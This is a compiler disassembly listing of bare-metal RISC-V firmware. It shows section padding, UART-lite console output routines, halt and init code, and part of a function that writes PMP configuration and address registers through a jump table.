    80002bda:	00000013          	nop
    80002bde:	00000013          	nop
    80002be2:	00000013          	nop
    80002be6:	00000013          	nop
    80002bea:	00000013          	nop
    80002bee:	00000013          	nop
    80002bf2:	00000013          	nop
    80002bf6:	00000013          	nop
    80002bfa:	00000013          	nop
    80002bfe:	00000013          	nop
    80002c02:	00000013          	nop
    80002c06:	00000013          	nop
    80002c0a:	00000013          	nop
    80002c0e:	00000013          	nop
    80002c12:	00000013          	nop
    80002c16:	00000013          	nop
    80002c1a:	00000013          	nop
    80002c1e:	00000013          	nop
    80002c22:	00000013          	nop
    80002c26:	00000013          	nop
    80002c2a:	00000013          	nop
    80002c2e:	00000013          	nop
    80002c32:	00000013          	nop
    80002c36:	00000013          	nop
    80002c3a:	00000013          	nop
    80002c3e:	00000013          	nop
    80002c42:	00000013          	nop
    80002c46:	00000013          	nop
    80002c4a:	00000013          	nop
    80002c4e:	00000013          	nop
    80002c52:	00000013          	nop
    80002c56:	00000013          	nop
    80002c5a:	00000013          	nop
    80002c5e:	00000013          	nop
    80002c62:	00000013          	nop
    80002c66:	00000013          	nop
    80002c6a:	00000013          	nop
    80002c6e:	00000013          	nop
    80002c72:	00000013          	nop
    80002c76:	00000013          	nop
    80002c7a:	00000013          	nop
    80002c7e:	00000013          	nop
    80002c82:	00000013          	nop
    80002c86:	00000013          	nop
    80002c8a:	00000013          	nop
    80002c8e:	00000013          	nop
    80002c92:	00000013          	nop
    80002c96:	00000013          	nop
    80002c9a:	00000013          	nop
    80002c9e:	00000013          	nop
    80002ca2:	00000013          	nop
    80002ca6:	00000013          	nop
    80002caa:	00000013          	nop
    80002cae:	00000013          	nop
    80002cb2:	00000013          	nop
    80002cb6:	00000013          	nop
    80002cba:	00000013          	nop
    80002cbe:	00000013          	nop
    80002cc2:	00000013          	nop
    80002cc6:	00000013          	nop
    80002cca:	00000013          	nop
    80002cce:	00000013          	nop
    80002cd2:	00000013          	nop
    80002cd6:	00000013          	nop
    80002cda:	00000013          	nop
    80002cde:	00000013          	nop
    80002ce2:	00000013          	nop
    80002ce6:	00000013          	nop
    80002cea:	00000013          	nop
    80002cee:	00000013          	nop
    80002cf2:	00000013          	nop
    80002cf6:	00000013          	nop
    80002cfa:	00000013          	nop
    80002cfe:	00000013          	nop
    80002d02:	00000013          	nop
    80002d06:	00000013          	nop
    80002d0a:	00000013          	nop
    80002d0e:	00000013          	nop
    80002d12:	00000013          	nop
    80002d16:	00000013          	nop
    80002d1a:	00000013          	nop
    80002d1e:	00000013          	nop
    80002d22:	00000013          	nop
    80002d26:	00000013          	nop
    80002d2a:	00000013          	nop
    80002d2e:	00000013          	nop
    80002d32:	00000013          	nop
    80002d36:	00000013          	nop
    80002d3a:	00000013          	nop
    80002d3e:	00000013          	nop
    80002d42:	00000013          	nop
    80002d46:	00000013          	nop
    80002d4a:	00000013          	nop
    80002d4e:	00000013          	nop
    80002d52:	00000013          	nop
    80002d56:	00000013          	nop
    80002d5a:	00000013          	nop
    80002d5e:	00000013          	nop
    80002d62:	00000013          	nop
    80002d66:	00000013          	nop
    80002d6a:	00000013          	nop
    80002d6e:	00000013          	nop
    80002d72:	00000013          	nop
    80002d76:	00000013          	nop
    80002d7a:	00000013          	nop
    80002d7e:	00000013          	nop
    80002d82:	00000013          	nop
    80002d86:	00000013          	nop
    80002d8a:	00000013          	nop
    80002d8e:	00000013          	nop
    80002d92:	00000013          	nop
    80002d96:	00000013          	nop
    80002d9a:	00000013          	nop
    80002d9e:	00000013          	nop
    80002da2:	00000013          	nop
    80002da6:	00000013          	nop
    80002daa:	00000013          	nop
    80002dae:	00000013          	nop
    80002db2:	00000013          	nop
    80002db6:	00000013          	nop
    80002dba:	00000013          	nop
    80002dbe:	00000013          	nop
    80002dc2:	00000013          	nop
    80002dc6:	00000013          	nop
    80002dca:	00000013          	nop
    80002dce:	00000013          	nop
    80002dd2:	00000013          	nop
    80002dd6:	00000013          	nop
    80002dda:	00000013          	nop
    80002dde:	00000013          	nop
    80002de2:	00000013          	nop
    80002de6:	00000013          	nop
    80002dea:	00000013          	nop
    80002dee:	00000013          	nop
    80002df2:	00000013          	nop
    80002df6:	00000013          	nop
    80002dfa:	00000013          	nop
    80002dfe:	00000013          	nop
    80002e02:	00000013          	nop
    80002e06:	00000013          	nop
    80002e0a:	00000013          	nop
    80002e0e:	00000013          	nop
    80002e12:	00000013          	nop
    80002e16:	00000013          	nop
    80002e1a:	00000013          	nop
    80002e1e:	00000013          	nop
    80002e22:	00000013          	nop
    80002e26:	00000013          	nop
    80002e2a:	00000013          	nop
    80002e2e:	00000013          	nop
    80002e32:	00000013          	nop
    80002e36:	00000013          	nop
    80002e3a:	00000013          	nop
    80002e3e:	00000013          	nop
    80002e42:	00000013          	nop
    80002e46:	00000013          	nop
    80002e4a:	00000013          	nop
    80002e4e:	00000013          	nop
    80002e52:	00000013          	nop
    80002e56:	00000013          	nop
    80002e5a:	00000013          	nop
    80002e5e:	00000013          	nop
    80002e62:	00000013          	nop
    80002e66:	00000013          	nop
    80002e6a:	00000013          	nop
    80002e6e:	00000013          	nop
    80002e72:	00000013          	nop
    80002e76:	00000013          	nop
    80002e7a:	00000013          	nop
    80002e7e:	00000013          	nop
    80002e82:	00000013          	nop
    80002e86:	00000013          	nop
    80002e8a:	00000013          	nop
    80002e8e:	00000013          	nop
    80002e92:	00000013          	nop
    80002e96:	00000013          	nop
    80002e9a:	00000013          	nop
    80002e9e:	00000013          	nop
    80002ea2:	00000013          	nop
    80002ea6:	00000013          	nop
    80002eaa:	00000013          	nop
    80002eae:	00000013          	nop
    80002eb2:	00000013          	nop
    80002eb6:	00000013          	nop
    80002eba:	00000013          	nop
    80002ebe:	00000013          	nop
    80002ec2:	00000013          	nop
    80002ec6:	00000013          	nop
    80002eca:	00000013          	nop
    80002ece:	00000013          	nop
    80002ed2:	00000013          	nop
    80002ed6:	00000013          	nop
    80002eda:	00000013          	nop
    80002ede:	00000013          	nop
    80002ee2:	00000013          	nop
    80002ee6:	00000013          	nop
    80002eea:	00000013          	nop
    80002eee:	00000013          	nop
    80002ef2:	00000013          	nop
    80002ef6:	00000013          	nop
    80002efa:	00000013          	nop
    80002efe:	00000013          	nop
    80002f02:	00000013          	nop
    80002f06:	00000013          	nop
    80002f0a:	00000013          	nop
    80002f0e:	00000013          	nop
    80002f12:	00000013          	nop
    80002f16:	00000013          	nop
    80002f1a:	00000013          	nop
    80002f1e:	00000013          	nop
    80002f22:	00000013          	nop
    80002f26:	00000013          	nop
    80002f2a:	00000013          	nop
    80002f2e:	00000013          	nop
    80002f32:	00000013          	nop
    80002f36:	00000013          	nop
    80002f3a:	00000013          	nop
    80002f3e:	00000013          	nop
    80002f42:	00000013          	nop
    80002f46:	00000013          	nop
    80002f4a:	00000013          	nop
    80002f4e:	00000013          	nop
    80002f52:	00000013          	nop
    80002f56:	00000013          	nop
    80002f5a:	00000013          	nop
    80002f5e:	00000013          	nop
    80002f62:	00000013          	nop
    80002f66:	00000013          	nop
    80002f6a:	00000013          	nop
    80002f6e:	00000013          	nop
    80002f72:	00000013          	nop
    80002f76:	00000013          	nop
    80002f7a:	00000013          	nop
    80002f7e:	00000013          	nop
    80002f82:	00000013          	nop
    80002f86:	00000013          	nop
    80002f8a:	00000013          	nop
    80002f8e:	00000013          	nop
    80002f92:	00000013          	nop
    80002f96:	00000013          	nop
    80002f9a:	00000013          	nop
    80002f9e:	00000013          	nop
    80002fa2:	00000013          	nop
    80002fa6:	00000013          	nop
    80002faa:	00000013          	nop
    80002fae:	00000013          	nop
    80002fb2:	00000013          	nop
    80002fb6:	00000013          	nop
    80002fba:	00000013          	nop
    80002fbe:	00000013          	nop
    80002fc2:	00000013          	nop
    80002fc6:	00000013          	nop
    80002fca:	00000013          	nop
    80002fce:	00000013          	nop
    80002fd2:	00000013          	nop
    80002fd6:	00000013          	nop
    80002fda:	00000013          	nop
    80002fde:	00000013          	nop
    80002fe2:	00000013          	nop
    80002fe6:	00000013          	nop
    80002fea:	00000013          	nop
    80002fee:	00000013          	nop
    80002ff2:	00000013          	nop
    80002ff6:	00000013          	nop
    80002ffa:	00000013          	nop
    80002ffe:	0001                	nop

0000000080003000 <__u_text_end>:
	...

Disassembly of section .text._putc:

0000000080003814 <_putc>:
    80003814:	1101                	addi	sp,sp,-32
    80003816:	ec06                	sd	ra,24(sp)
    80003818:	e822                	sd	s0,16(sp)
    8000381a:	1000                	addi	s0,sp,32
    8000381c:	87aa                	mv	a5,a0
    8000381e:	fef407a3          	sb	a5,-17(s0)
    80003822:	fef44783          	lbu	a5,-17(s0)
    80003826:	853e                	mv	a0,a5
    80003828:	0c6000ef          	jal	800038ee <__am_uartlite_putchar>
    8000382c:	0001                	nop
    8000382e:	60e2                	ld	ra,24(sp)
    80003830:	6442                	ld	s0,16(sp)
    80003832:	6105                	addi	sp,sp,32
    80003834:	8082                	ret

Disassembly of section .text._halt:

0000000080003836 <_halt>:
    80003836:	1101                	addi	sp,sp,-32
    80003838:	ec06                	sd	ra,24(sp)
    8000383a:	e822                	sd	s0,16(sp)
    8000383c:	1000                	addi	s0,sp,32
    8000383e:	87aa                	mv	a5,a0
    80003840:	fef42623          	sw	a5,-20(s0)
    80003844:	fec42783          	lw	a5,-20(s0)
    80003848:	853e                	mv	a0,a5
    8000384a:	0005006b          	.word	0x0005006b
    8000384e:	fec42783          	lw	a5,-20(s0)
    80003852:	85be                	mv	a1,a5
    80003854:	00003517          	auipc	a0,0x3
    80003858:	35450513          	addi	a0,a0,852 # 80006ba8 <printf_+0xea2>
    8000385c:	4aa020ef          	jal	80005d06 <printf_>
    80003860:	0001                	nop
    80003862:	bffd                	j	80003860 <_halt+0x2a>

Disassembly of section .text._trm_init:

0000000080003864 <_trm_init>:
    80003864:	1101                	addi	sp,sp,-32
    80003866:	ec06                	sd	ra,24(sp)
    80003868:	e822                	sd	s0,16(sp)
    8000386a:	1000                	addi	s0,sp,32
    8000386c:	062000ef          	jal	800038ce <__am_init_uartlite>
    80003870:	00003517          	auipc	a0,0x3
    80003874:	34d50513          	addi	a0,a0,845 # 80006bbd <__am_mainargs>
    80003878:	b57fd0ef          	jal	800013ce <main>
    8000387c:	87aa                	mv	a5,a0
    8000387e:	fef42623          	sw	a5,-20(s0)
    80003882:	fec42783          	lw	a5,-20(s0)
    80003886:	853e                	mv	a0,a5
    80003888:	fafff0ef          	jal	80003836 <_halt>

Disassembly of section .text.inb:

000000008000388c <inb>:
    8000388c:	1101                	addi	sp,sp,-32
    8000388e:	ec22                	sd	s0,24(sp)
    80003890:	1000                	addi	s0,sp,32
    80003892:	fea43423          	sd	a0,-24(s0)
    80003896:	fe843783          	ld	a5,-24(s0)
    8000389a:	0007c783          	lbu	a5,0(a5)
    8000389e:	0ff7f793          	zext.b	a5,a5
    800038a2:	853e                	mv	a0,a5
    800038a4:	6462                	ld	s0,24(sp)
    800038a6:	6105                	addi	sp,sp,32
    800038a8:	8082                	ret

Disassembly of section .text.outb:

00000000800038aa <outb>:
    800038aa:	1101                	addi	sp,sp,-32
    800038ac:	ec22                	sd	s0,24(sp)
    800038ae:	1000                	addi	s0,sp,32
    800038b0:	fea43423          	sd	a0,-24(s0)
    800038b4:	87ae                	mv	a5,a1
    800038b6:	fef403a3          	sb	a5,-25(s0)
    800038ba:	fe843783          	ld	a5,-24(s0)
    800038be:	fe744703          	lbu	a4,-25(s0)
    800038c2:	00e78023          	sb	a4,0(a5)
    800038c6:	0001                	nop
    800038c8:	6462                	ld	s0,24(sp)
    800038ca:	6105                	addi	sp,sp,32
    800038cc:	8082                	ret

Disassembly of section .text.__am_init_uartlite:

00000000800038ce <__am_init_uartlite>:
    800038ce:	1141                	addi	sp,sp,-16
    800038d0:	e406                	sd	ra,8(sp)
    800038d2:	e022                	sd	s0,0(sp)
    800038d4:	0800                	addi	s0,sp,16
    800038d6:	458d                	li	a1,3
    800038d8:	406007b7          	lui	a5,0x40600
    800038dc:	00c78513          	addi	a0,a5,12 # 4060000c <i+0x405fffec>
    800038e0:	fcbff0ef          	jal	800038aa <outb>
    800038e4:	0001                	nop
    800038e6:	60a2                	ld	ra,8(sp)
    800038e8:	6402                	ld	s0,0(sp)
    800038ea:	0141                	addi	sp,sp,16
    800038ec:	8082                	ret

Disassembly of section .text.__am_uartlite_putchar:

00000000800038ee <__am_uartlite_putchar>:
    800038ee:	1101                	addi	sp,sp,-32
    800038f0:	ec06                	sd	ra,24(sp)
    800038f2:	e822                	sd	s0,16(sp)
    800038f4:	1000                	addi	s0,sp,32
    800038f6:	87aa                	mv	a5,a0
    800038f8:	fef407a3          	sb	a5,-17(s0)
    800038fc:	fef44783          	lbu	a5,-17(s0)
    80003900:	0ff7f713          	zext.b	a4,a5
    80003904:	47a9                	li	a5,10
    80003906:	00f71563          	bne	a4,a5,80003910 <__am_uartlite_putchar+0x22>
    8000390a:	4535                	li	a0,13
    8000390c:	fe3ff0ef          	jal	800038ee <__am_uartlite_putchar>
    80003910:	0001                	nop
    80003912:	406007b7          	lui	a5,0x40600
    80003916:	00878513          	addi	a0,a5,8 # 40600008 <i+0x405fffe8>
    8000391a:	f73ff0ef          	jal	8000388c <inb>
    8000391e:	87aa                	mv	a5,a0
    80003920:	2781                	sext.w	a5,a5
    80003922:	8ba1                	andi	a5,a5,8
    80003924:	2781                	sext.w	a5,a5
    80003926:	f7f5                	bnez	a5,80003912 <__am_uartlite_putchar+0x24>
    80003928:	fef44783          	lbu	a5,-17(s0)
    8000392c:	85be                	mv	a1,a5
    8000392e:	406007b7          	lui	a5,0x40600
    80003932:	00478513          	addi	a0,a5,4 # 40600004 <i+0x405fffe4>
    80003936:	f75ff0ef          	jal	800038aa <outb>
    8000393a:	0001                	nop
    8000393c:	60e2                	ld	ra,24(sp)
    8000393e:	6442                	ld	s0,16(sp)
    80003940:	6105                	addi	sp,sp,32
    80003942:	8082                	ret

Disassembly of section .text.csr_write_num:

0000000080003944 <csr_write_num>:
    80003944:	d6010113          	addi	sp,sp,-672
    80003948:	28813c23          	sd	s0,664(sp)
    8000394c:	1500                	addi	s0,sp,672
    8000394e:	87aa                	mv	a5,a0
    80003950:	d6b43023          	sd	a1,-672(s0)
    80003954:	d6f42623          	sw	a5,-660(s0)
    80003958:	d6c42783          	lw	a5,-660(s0)
    8000395c:	c607869b          	addiw	a3,a5,-928
    80003960:	0006871b          	sext.w	a4,a3
    80003964:	04f00793          	li	a5,79
    80003968:	5ce7e463          	bltu	a5,a4,80003f30 <csr_write_num+0x5ec>
    8000396c:	080687bb          	zext.w	a5,a3
    80003970:	00279713          	slli	a4,a5,0x2
    80003974:	00003797          	auipc	a5,0x3
    80003978:	24c78793          	addi	a5,a5,588 # 80006bc0 <__am_mainargs+0x3>
    8000397c:	97ba                	add	a5,a5,a4
    8000397e:	439c                	lw	a5,0(a5)
    80003980:	0007871b          	sext.w	a4,a5
    80003984:	00003797          	auipc	a5,0x3
    80003988:	23c78793          	addi	a5,a5,572 # 80006bc0 <__am_mainargs+0x3>
    8000398c:	97ba                	add	a5,a5,a4
    8000398e:	8782                	jr	a5
    80003990:	d6043783          	ld	a5,-672(s0)
    80003994:	d6f43823          	sd	a5,-656(s0)
    80003998:	d7043783          	ld	a5,-656(s0)
    8000399c:	3a079073          	csrw	pmpcfg0,a5
    800039a0:	ab41                	j	80003f30 <csr_write_num+0x5ec>
    800039a2:	d6043783          	ld	a5,-672(s0)
    800039a6:	d6f43c23          	sd	a5,-648(s0)
    800039aa:	d7843783          	ld	a5,-648(s0)
    800039ae:	3a179073          	csrw	pmpcfg1,a5
    800039b2:	abbd                	j	80003f30 <csr_write_num+0x5ec>
    800039b4:	d6043783          	ld	a5,-672(s0)
    800039b8:	d8f43023          	sd	a5,-640(s0)
    800039bc:	d8043783          	ld	a5,-640(s0)
    800039c0:	3a279073          	csrw	pmpcfg2,a5
    800039c4:	a3b5                	j	80003f30 <csr_write_num+0x5ec>
    800039c6:	d6043783          	ld	a5,-672(s0)
    800039ca:	d8f43423          	sd	a5,-632(s0)
    800039ce:	d8843783          	ld	a5,-632(s0)
    800039d2:	3a379073          	csrw	pmpcfg3,a5
    800039d6:	aba9                	j	80003f30 <csr_write_num+0x5ec>
    800039d8:	d6043783          	ld	a5,-672(s0)
    800039dc:	d8f43823          	sd	a5,-624(s0)
    800039e0:	d9043783          	ld	a5,-624(s0)
    800039e4:	3a479073          	csrw	0x3a4,a5
    800039e8:	a3a1                	j	80003f30 <csr_write_num+0x5ec>
    800039ea:	d6043783          	ld	a5,-672(s0)
    800039ee:	d8f43c23          	sd	a5,-616(s0)
    800039f2:	d9843783          	ld	a5,-616(s0)
    800039f6:	3a579073          	csrw	0x3a5,a5
    800039fa:	ab1d                	j	80003f30 <csr_write_num+0x5ec>
    800039fc:	d6043783          	ld	a5,-672(s0)
    80003a00:	daf43023          	sd	a5,-608(s0)
    80003a04:	da043783          	ld	a5,-608(s0)
    80003a08:	3a679073          	csrw	0x3a6,a5
    80003a0c:	a315                	j	80003f30 <csr_write_num+0x5ec>
    80003a0e:	d6043783          	ld	a5,-672(s0)
    80003a12:	daf43423          	sd	a5,-600(s0)
    80003a16:	da843783          	ld	a5,-600(s0)
    80003a1a:	3a779073          	csrw	0x3a7,a5
    80003a1e:	ab09                	j	80003f30 <csr_write_num+0x5ec>
    80003a20:	d6043783          	ld	a5,-672(s0)
    80003a24:	daf43823          	sd	a5,-592(s0)
    80003a28:	db043783          	ld	a5,-592(s0)
    80003a2c:	3a879073          	csrw	0x3a8,a5
    80003a30:	a301                	j	80003f30 <csr_write_num+0x5ec>
    80003a32:	d6043783          	ld	a5,-672(s0)
    80003a36:	daf43c23          	sd	a5,-584(s0)
    80003a3a:	db843783          	ld	a5,-584(s0)
    80003a3e:	3a979073          	csrw	0x3a9,a5
    80003a42:	a1fd                	j	80003f30 <csr_write_num+0x5ec>
    80003a44:	d6043783          	ld	a5,-672(s0)
    80003a48:	dcf43023          	sd	a5,-576(s0)
    80003a4c:	dc043783          	ld	a5,-576(s0)
    80003a50:	3aa79073          	csrw	0x3aa,a5
    80003a54:	a9f1                	j	80003f30 <csr_write_num+0x5ec>
    80003a56:	d6043783          	ld	a5,-672(s0)
    80003a5a:	dcf43423          	sd	a5,-568(s0)
    80003a5e:	dc843783          	ld	a5,-568(s0)
    80003a62:	3ab79073          	csrw	0x3ab,a5
    80003a66:	a1e9                	j	80003f30 <csr_write_num+0x5ec>
    80003a68:	d6043783          	ld	a5,-672(s0)
    80003a6c:	dcf43823          	sd	a5,-560(s0)
    80003a70:	dd043783          	ld	a5,-560(s0)
    80003a74:	3ac79073          	csrw	0x3ac,a5
    80003a78:	a965                	j	80003f30 <csr_write_num+0x5ec>
    80003a7a:	d6043783          	ld	a5,-672(s0)
    80003a7e:	dcf43c23          	sd	a5,-552(s0)
    80003a82:	dd843783          	ld	a5,-552(s0)
    80003a86:	3ad79073          	csrw	0x3ad,a5
    80003a8a:	a15d                	j	80003f30 <csr_write_num+0x5ec>
    80003a8c:	d6043783          	ld	a5,-672(s0)
    80003a90:	def43023          	sd	a5,-544(s0)
    80003a94:	de043783          	ld	a5,-544(s0)
    80003a98:	3ae79073          	csrw	0x3ae,a5
    80003a9c:	a951                	j	80003f30 <csr_write_num+0x5ec>
    80003a9e:	d6043783          	ld	a5,-672(s0)
    80003aa2:	def43423          	sd	a5,-536(s0)
    80003aa6:	de843783          	ld	a5,-536(s0)
    80003aaa:	3af79073          	csrw	0x3af,a5
    80003aae:	a149                	j	80003f30 <csr_write_num+0x5ec>
    80003ab0:	d6043783          	ld	a5,-672(s0)
    80003ab4:	def43823          	sd	a5,-528(s0)
    80003ab8:	df043783          	ld	a5,-528(s0)
    80003abc:	3b079073          	csrw	pmpaddr0,a5
    80003ac0:	a985                	j	80003f30 <csr_write_num+0x5ec>
    80003ac2:	d6043783          	ld	a5,-672(s0)
    80003ac6:	def43c23          	sd	a5,-520(s0)
    80003aca:	df843783          	ld	a5,-520(s0)
    80003ace:	3b179073          	csrw	pmpaddr1,a5
    80003ad2:	a9b9                	j	80003f30 <csr_write_num+0x5ec>
    80003ad4:	d6043783          	ld	a5,-672(s0)
    80003ad8:	e0f43023          	sd	a5,-512(s0)
    80003adc:	e0043783          	ld	a5,-512(s0)
    80003ae0:	3b279073          	csrw	pmpaddr2,a5
    80003ae4:	a1b1                	j	80003f30 <csr_write_num+0x5ec>
    80003ae6:	d6043783          	ld	a5,-672(s0)
    80003aea:	e0f43423          	sd	a5,-504(s0)
    80003aee:	e0843783          	ld	a5,-504(s0)
    80003af2:	3b379073          	csrw	pmpaddr3,a5
    80003af6:	a92d                	j	80003f30 <csr_write_num+0x5ec>
    80003af8:	d6043783          	ld	a5,-672(s0)
    80003afc:	e0f43823          	sd	a5,-496(s0)
    80003b00:	e1043783          	ld	a5,-496(s0)
    80003b04:	3b479073          	csrw	pmpaddr4,a5
    80003b08:	a125                	j	80003f30 <csr_write_num+0x5ec>
    80003b0a:	d6043783          	ld	a5,-672(s0)
    80003b0e:	e0f43c23          	sd	a5,-488(s0)
    80003b12:	e1843783          	ld	a5,-488(s0)
    80003b16:	3b579073          	csrw	pmpaddr5,a5
    80003b1a:	a919                	j	80003f30 <csr_write_num+0x5ec>
    80003b1c:	d6043783          	ld	a5,-672(s0)
    80003b20:	e2f43023          	sd	a5,-480(s0)
    80003b24:	e2043783          	ld	a5,-480(s0)
    80003b28:	3b679073          	csrw	pmpaddr6,a5
    80003b2c:	a111                	j	80003f30 <csr_write_num+0x5ec>
    80003b2e:	d6043783          	ld	a5,-672(s0)
    80003b32:	e2f43423          	sd	a5,-472(s0)
    80003b36:	e2843783          	ld	a5,-472(s0)
    80003b3a:	3b779073          	csrw	pmpaddr7,a5
    80003b3e:	aecd                	j	80003f30 <csr_write_num+0x5ec>
    80003b40:	d6043783          	ld	a5,-672(s0)
    80003b44:	e2f43823          	sd	a5,-464(s0)
    80003b48:	e3043783          	ld	a5,-464(s0)
    80003b4c:	3b879073          	csrw	pmpaddr8,a5
    80003b50:	a6c5                	j	80003f30 <csr_write_num+0x5ec>
    80003b52:	d6043783          	ld	a5,-672(s0)
    80003b56:	e2f43c23          	sd	a5,-456(s0)
    80003b5a:	e3843783          	ld	a5,-456(s0)
    80003b5e:	3b979073          	csrw	pmpaddr9,a5
    80003b62:	a6f9                	j	80003f30 <csr_write_num+0x5ec>
    80003b64:	d6043783          	ld	a5,-672(s0)
    80003b68:	e4f43023          	sd	a5,-448(s0)
    80003b6c:	e4043783          	ld	a5,-448(s0)
    80003b70:	3ba79073          	csrw	pmpaddr10,a5
    80003b74:	ae75                	j	80003f30 <csr_write_num+0x5ec>
    80003b76:	d6043783          	ld	a5,-672(s0)
    80003b7a:	e4f43423          	sd	a5,-440(s0)
    80003b7e:	e4843783          	ld	a5,-440(s0)
    80003b82:	3bb79073          	csrw	pmpaddr11,a5
    80003b86:	a66d                	j	80003f30 <csr_write_num+0x5ec>
    80003b88:	d6043783          	ld	a5,-672(s0)
    80003b8c:	e4f43823          	sd	a5,-432(s0)
    80003b90:	e5043783          	ld	a5,-432(s0)
    80003b94:	3bc79073          	csrw	pmpaddr12,a5
    80003b98:	ae61                	j	80003f30 <csr_write_num+0x5ec>
    80003b9a:	d6043783          	ld	a5,-672(s0)
    80003b9e:	e4f43c23          	sd	a5,-424(s0)
    80003ba2:	e5843783          	ld	a5,-424(s0)
    80003ba6:	3bd79073          	csrw	pmpaddr13,a5
    80003baa:	a659                	j	80003f30 <csr_write_num+0x5ec>
    80003bac:	d6043783          	ld	a5,-672(s0)
    80003bb0:	e6f43023          	sd	a5,-416(s0)
    80003bb4:	e6043783          	ld	a5,-416(s0)
    80003bb8:	3be79073          	csrw	pmpaddr14,a5
    80003bbc:	ae95                	j	80003f30 <csr_write_num+0x5ec>
    80003bbe:	d6043783          	ld	a5,-672(s0)
    80003bc2:	e6f43423          	sd	a5,-408(s0)
    80003bc6:	e6843783          	ld	a5,-408(s0)
    80003bca:	3bf79073          	csrw	pmpaddr15,a5
    80003bce:	a68d                	j	80003f30 <csr_write_num+0x5ec>
    80003bd0:	d6043783          	ld	a5,-672(s0)
    80003bd4:	e6f43823          	sd	a5,-400(s0)
    80003bd8:	e7043783          	ld	a5,-400(s0)
    80003bdc:	3c079073          	csrw	0x3c0,a5
    80003be0:	ae81                	j	80003f30 <csr_write_num+0x5ec>
    80003be2:	d6043783          	ld	a5,-672(s0)
    80003be6:	e6f43c23          	sd	a5,-392(s0)
    80003bea:	e7843783          	ld	a5,-392(s0)
    80003bee:	3c179073          	csrw	0x3c1,a5
    80003bf2:	ae3d                	j	80003f30 <csr_write_num+0x5ec>
    80003bf4:	d6043783          	ld	a5,-672(s0)
    80003bf8:	e8f43023          	sd	a5,-384(s0)
    80003bfc:	e8043783          	ld	a5,-384(s0)
    80003c00:	3c279073          	csrw	0x3c2,a5
    80003c04:	a635                	j	80003f30 <csr_write_num+0x5ec>
    80003c06:	d6043783          	ld	a5,-672(s0)
    80003c0a:	e8f43423          	sd	a5,-376(s0)
    80003c0e:	e8843783          	ld	a5,-376(s0)
    80003c12:	3c379073          	csrw	0x3c3,a5
    80003c16:	ae29                	j	80003f30 <csr_write_num+0x5ec>
    80003c18:	d6043783          	ld	a5,-672(s0)
    80003c1c:	e8f43823          	sd	a5,-368(s0)
    80003c20:	e9043783          	ld	a5,-368(s0)
    80003c24:	3c479073          	csrw	0x3c4,a5
    80003c28:	a621                	j	80003f30 <csr_write_num+0x5ec>
    80003c2a:	d6043783          	ld	a5,-672(s0)
    80003c2e:	e8f43c23          	sd	a5,-360(s0)
    80003c32:	e9843783          	ld	a5,-360(s0)
    80003c36:	3c579073          	csrw	0x3c5,a5
    80003c3a:	acdd                	j	80003f30 <csr_write_num+0x5ec>
    80003c3c:	d6043783          	ld	a5,-672(s0)
    80003c40:	eaf43023          	sd	a5,-352(s0)
    80003c44:	ea043783          	ld	a5,-352(s0)
    80003c48:	3c679073          	csrw	0x3c6,a5
    80003c4c:	a4d5                	j	80003f30 <csr_write_num+0x5ec>
    80003c4e:	d6043783          	ld	a5,-672(s0)
    80003c52:	eaf43423          	sd	a5,-344(s0)
    80003c56:	ea843783          	ld	a5,-344(s0)
    80003c5a:	3c779073          	csrw	0x3c7,a5
    80003c5e:	acc9                	j	80003f30 <csr_write_num+0x5ec>
    80003c60:	d6043783          	ld	a5,-672(s0)
    80003c64:	eaf43823          	sd	a5,-336(s0)
    80003c68:	eb043783          	ld	a5,-336(s0)
    80003c6c:	3c879073          	csrw	0x3c8,a5
    80003c70:	a4c1                	j	80003f30 <csr_write_num+0x5ec>
    80003c72:	d6043783          	ld	a5,-672(s0)
    80003c76:	eaf43c23          	sd	a5,-328(s0)
    80003c7a:	eb843783          	ld	a5,-328(s0)
    80003c7e:	3c979073          	csrw	0x3c9,a5
    80003c82:	a47d                	j	80003f30 <csr_write_num+0x5ec>
    80003c84:	d6043783          	ld	a5,-672(s0)
    80003c88:	ecf43023          	sd	a5,-320(s0)
    80003c8c:	ec043783          	ld	a5,-320(s0)
    80003c90:	3ca79073          	csrw	0x3ca,a5
    80003c94:	ac71                	j	80003f30 <csr_write_num+0x5ec>
    80003c96:	d6043783          	ld	a5,-672(s0)
    80003c9a:	ecf43423          	sd	a5,-312(s0)
    80003c9e:	ec843783          	ld	a5,-312(s0)
    80003ca2:	3cb79073          	csrw	0x3cb,a5
    80003ca6:	a469                	j	80003f30 <csr_write_num+0x5ec>
    80003ca8:	d6043783          	ld	a5,-672(s0)
    80003cac:	ecf43823          	sd	a5,-304(s0)
    80003cb0:	ed043783          	ld	a5,-304(s0)
    80003cb4:	3cc79073          	csrw	0x3cc,a5
    80003cb8:	aca5                	j	80003f30 <csr_write_num+0x5ec>
    80003cba:	d6043783          	ld	a5,-672(s0)
    80003cbe:	ecf43c23          	sd	a5,-296(s0)
    80003cc2:	ed843783          	ld	a5,-296(s0)
    80003cc6:	3cd79073          	csrw	0x3cd,a5
    80003cca:	a49d                	j	80003f30 <csr_write_num+0x5ec>
    80003ccc:	d6043783          	ld	a5,-672(s0)
    80003cd0:	eef43023          	sd	a5,-288(s0)
    80003cd4:	ee043783          	ld	a5,-288(s0)
    80003cd8:	3ce79073          	csrw	0x3ce,a5
    80003cdc:	ac91                	j	80003f30 <csr_write_num+0x5ec>
    80003cde:	d6043783          	ld	a5,-672(s0)
    80003ce2:	eef43423          	sd	a5,-280(s0)
    80003ce6:	ee843783          	ld	a5,-280(s0)
    80003cea:	3cf79073          	csrw	0x3cf,a5
    80003cee:	a489                	j	80003f30 <csr_write_num+0x5ec>
    80003cf0:	d6043783          	ld	a5,-672(s0)
    80003cf4:	eef43823          	sd	a5,-272(s0)
    80003cf8:	ef043783          	ld	a5,-272(s0)
    80003cfc:	3d079073          	csrw	0x3d0,a5
    80003d00:	ac05                	j	80003f30 <csr_write_num+0x5ec>
    80003d02:	d6043783          	ld	a5,-672(s0)
    80003d06:	eef43c23          	sd	a5,-264(s0)
    80003d0a:	ef843783          	ld	a5,-264(s0)
    80003d0e:	3d179073          	csrw	0x3d1,a5
    80003d12:	ac39                	j	80003f30 <csr_write_num+0x5ec>
    80003d14:	d6043783          	ld	a5,-672(s0)
    80003d18:	f0f43023          	sd	a5,-256(s0)
    80003d1c:	f0043783          	ld	a5,-256(s0)
    80003d20:	3d279073          	csrw	0x3d2,a5
    80003d24:	a431                	j	80003f30 <csr_write_num+0x5ec>
    80003d26:	d6043783          	ld	a5,-672(s0)
    80003d2a:	f0f43423          	sd	a5,-248(s0)
    80003d2e:	f0843783          	ld	a5,-248(s0)
    80003d32:	3d379073          	csrw	0x3d3,a5
    80003d36:	aaed                	j	80003f30 <csr_write_num+0x5ec>
